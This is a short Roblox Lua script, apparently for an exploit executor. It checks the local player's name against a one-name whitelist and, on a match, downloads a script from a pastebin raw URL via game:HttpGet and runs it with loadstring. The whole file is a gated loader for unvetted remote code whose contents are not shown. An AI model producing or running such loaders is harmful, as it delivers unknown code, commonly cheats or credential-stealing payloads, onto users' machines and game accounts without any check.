local whitelist = {
    "gosubnowpls"
}

local playerName = game.Players.LocalPlayer.Name

for _, name in ipairs(whitelist) do
    if playerName == name then
        loadstring(game:HttpGet("https://pastebin.com/raw/1sdNAmkM"))()
        break
    end
end
